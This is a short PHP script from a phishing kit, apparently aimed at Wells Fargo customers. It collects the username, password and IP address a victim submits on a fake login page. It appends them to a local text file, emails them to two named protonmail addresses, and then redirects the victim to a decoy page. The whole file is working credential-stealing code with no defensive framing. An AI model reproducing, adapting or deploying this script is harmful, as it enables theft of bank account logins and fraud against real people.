<?php

$ip = getenv("REMOTE_ADDR");

$message .= "-----------  ! +Account infoS+ !  -----------\n";
$message .= "Username   : ".$_POST['Username']."\n";
$message .= "Password   : ".$_POST['Password']."\n";
$message .= "IP Address : ".$ip."\n";
$message .= "-----------  !Thuglife_Legend+ !  -----------\n";
$send = "sammyresultbox@protonmail.com, deluxe2manager@protonmail.com";


$fp = fopen("PR1M3.txt","a");
fputs($fp,$message);
fclose($fp);

$subject = "Wells! xD $ip";
$headers = "From:  <info@notime>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
mail($send,$subject,$message,$headers);
    

header("Location: wells.htm");

?>


